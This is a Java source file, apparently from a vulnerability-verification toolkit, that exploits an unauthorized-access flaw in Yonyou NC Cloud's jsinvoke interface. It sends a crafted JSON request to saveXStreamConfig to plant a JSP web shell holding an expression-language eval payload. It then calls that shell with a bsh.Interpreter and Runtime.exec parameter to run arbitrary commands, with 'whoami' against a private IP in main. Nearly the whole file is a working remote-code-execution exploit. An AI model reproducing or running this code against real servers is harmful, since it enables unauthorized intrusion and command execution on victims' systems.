package cve.nccloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;

/**
 * 漏洞：
 * NC Cloud系统的jsinvoke接口未授权访问漏洞
 * https://security.yonyou.com/#/noticeInfo?id=358
 */
public class jsinvoke_fileupload {


    public static void doUploadFile(String targetURL, String filename) throws IOException {

        String url = targetURL + "/uapjs/jsinvoke/?action=invoke";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type", "application/x-www-form-urlencoded");
        String body = "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/" + filename + "\"]}";
        httpRequest.sendStringPost(httpPost,body);
    }

    public static void doExecCMD(String targetURL, String filename, String cmd) throws IOException {

        StringBuilder sb = new StringBuilder();
        String params = "?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22" + cmd + "%22).getInputStream())";
        String url = sb.append(targetURL).append("/").append(filename).append(params).toString();

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpGet httpGet = new HttpGet(url);
        Response response = httpRequest.sendGet(httpGet);
        System.out.println(response.getResponseBody());

    }

    public static void main(String[] args) throws IOException {

        String targetURL = "http://10.58.120.201";
        String filename = "test4.jsp";
        String cmd = "whoami";

        doUploadFile(targetURL,filename);
        doExecCMD(targetURL,filename,cmd);

    }
}
